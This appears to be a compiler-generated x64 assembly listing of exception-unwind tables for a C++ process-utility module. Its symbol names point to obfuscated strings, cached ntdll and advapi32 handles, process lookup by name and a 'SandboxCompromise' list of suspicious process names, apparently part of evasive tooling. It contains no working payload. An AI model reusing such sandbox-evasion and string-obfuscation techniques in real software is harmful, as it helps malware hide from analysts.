xdata	SEGMENT
$ip2state$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DB 04H
	DB	0a2H
	DB	02H
	DB	'i', 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ DB 02H
	DB	0acH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?BMGONCACNKPGIEIF@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DB 04H
	DB	0a8H
	DB	02H
	DB	']', 04H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel $ip2state$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z DD 061e19H
	DD	0a640fH
	DD	08340fH
	DD	0700b520fH
	DD	imagerel __GSHandlerCheck
	DD	020H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD 040021H
	DD	047400H
	DD	083400H
	DD	imagerel $LN109
	DD	imagerel $LN109+41
	DD	imagerel $unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD 021H
	DD	imagerel $LN109
	DD	imagerel $LN109+41
	DD	imagerel $unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD 040021H
	DD	047400H
	DD	083400H
	DD	imagerel $LN109
	DD	imagerel $LN109+41
	DD	imagerel $unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD 021H
	DD	imagerel $LN109
	DD	imagerel $LN109+41
	DD	imagerel $unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD 041221H
	DD	047412H
	DD	083405H
	DD	imagerel $LN109
	DD	imagerel $LN109+41
	DD	imagerel $unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z DD 031001H
	DD	0e00c4210H
	DD	0600aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD 020021H
	DD	043400H
	DD	imagerel $LN50
	DD	imagerel $LN50+19
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD 021H
	DD	imagerel $LN50
	DD	imagerel $LN50+19
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD 020521H
	DD	043405H
	DD	imagerel $LN50
	DD	imagerel $LN50+19
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z DD 040a01H
	DD	09340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ DD 040c01H
	DD	0c340cH
	DD	07008920cH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??__E_loadedLibs@@YAXXZ DB 04H
	DB	012H
	DB	00H
	DB	0b0H
	DB	04H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??__E_loadedLibs@@YAXXZ DB 04H
	DB	0eH
	DD	imagerel ?dtor$1@?0???__E_loadedLibs@@YAXXZ@4HA
	DB	02eH
	DD	imagerel ?dtor$2@?0???__E_loadedLibs@@YAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??__E_loadedLibs@@YAXXZ DB 028H
	DD	imagerel $stateUnwindMap$??__E_loadedLibs@@YAXXZ
	DD	imagerel $ip2state$??__E_loadedLibs@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__E_loadedLibs@@YAXXZ DD 010411H
	DD	04204H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??__E_loadedLibs@@YAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__F_loadedLibs@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z DB 04H
	DB	't'
	DB	04H
	DB	0faH
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA
	DB	02cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	060H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z DB 028H
	DD	imagerel $stateUnwindMap$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z
	DD	imagerel $ip2state$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z DD 061b19H
	DD	0e340cH
	DD	07008720cH
	DD	050066007H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z
	DD	03aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD 021H
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+25
	DD	imagerel $unwind$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD 080021H
	DD	04f400H
	DD	05e400H
	DD	06c400H
	DD	0e3400H
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+25
	DD	imagerel $unwind$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD 021H
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+25
	DD	imagerel $unwind$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD 083021H
	DD	06c430H
	DD	04f412H
	DD	05e40aH
	DD	0e3405H
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+25
	DD	imagerel $unwind$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD 050a01H
	DD	0d006620aH
	DD	060037004H
	DD	05002H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	099H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z DB 08H
	DB	'B'
	DB	00H
	DB	0bcH
	DB	04H
	DB	'*'
	DB	00H
	DB	0c4H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA
	DB	032H
	DD	imagerel ??1_bstr_t@@QEAA@XZ
	DB	0a0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z DB 028H
	DD	imagerel $stateUnwindMap$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z
	DD	imagerel $ip2state$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z DD 081411H
	DD	0b6414H
	DD	095414H
	DD	083414H
	DD	070105214H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 0aH
	DB	'l'
	DB	02H
	DB	'E', 03H
	DB	04H
	DB	'U', 03H
	DB	02H
	DB	0b8H
	DB	00H
	DB	'J'
	DB	04H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 04H
	DB	0cH
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	0e0H
	DB	032H
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	060H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DB 028H
	DD	imagerel $stateUnwindMap$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	imagerel $ip2state$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD 082619H
	DD	0156417H
	DD	0145417H
	DD	0133417H
	DD	07010f217H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
	DD	07aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ DB 02H
	DB	0b2H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ DD 020611H
	DD	030023206H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	0430H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?PIDFromName@ProcessUtilities@@YAKPEBD@Z DB 01cH
	DB	08eH
	DB	00H
	DB	0c6H
	DB	02H
	DB	09eH
	DB	00H
	DB	'8'
	DB	04H
	DB	'8'
	DB	00H
	DB	085H, 02H
	DB	06H
	DB	'2'
	DB	00H
	DB	'V'
	DB	08H
	DB	'X'
	DB	00H
	DB	0c9H, 05H
	DB	0aH
	DB	0a0H
	DB	0cH
	DB	0f2H
	DB	00H
	DB	0a4H
	DB	0aH
	DB	016H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?PIDFromName@ProcessUtilities@@YAKPEBD@Z DB 0cH
	DB	0eH
	DD	imagerel ?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DB	034H
	DD	imagerel ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
	DB	040H
	DB	066H
	DD	imagerel ?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DB	08eH
	DD	imagerel ?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DB	0b6H
	DD	imagerel ?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DB	0daH
	DD	imagerel ??1_bstr_t@@QEAA@XZ
	DB	040H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?PIDFromName@ProcessUtilities@@YAKPEBD@Z DB 028H
	DD	imagerel $stateUnwindMap$?PIDFromName@ProcessUtilities@@YAKPEBD@Z
	DD	imagerel $ip2state$?PIDFromName@ProcessUtilities@@YAKPEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?PIDFromName@ProcessUtilities@@YAKPEBD@Z DD 0d3819H
	DD	0727427H
	DD	0716427H
	DD	0703427H
	DD	06a0127H
	DD	0e016f018H
	DD	0c012d014H
	DD	05010H
	DD	imagerel __GSHandlerCheck_EH4
	DD	imagerel $cppxdata$?PIDFromName@ProcessUtilities@@YAKPEBD@Z
	DD	0342H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA DD 010201H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ DB 02H
	DB	'Y', 02H
	DB	02H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ DB 028H
	DD	imagerel $stateUnwindMap$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ
	DD	imagerel $ip2state$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ DD 020611H
	DD	030027206H
	DD	imagerel __CxxFrameHandler4
